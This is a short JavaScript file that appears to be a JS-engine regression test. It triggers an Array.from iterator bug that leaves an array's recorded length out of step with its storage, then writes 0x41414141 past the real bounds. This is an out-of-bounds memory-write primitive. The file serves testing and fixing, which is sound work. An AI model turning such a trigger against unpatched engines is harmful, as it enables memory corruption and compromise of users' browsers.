





let oobArray = [];
let maxSize = 1028 * 8;
Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ => (
  {
    counter : 0,
    next() {
      let result = this.counter++;
      if (this.counter > maxSize) {
        oobArray.length = 0;
        return {done: true};
      } else {
        return {value: result, done: false};
      }
    }
  }
) });
assertEquals(oobArray.length, maxSize);



oobArray[oobArray.length - 1] = 0x41414141;
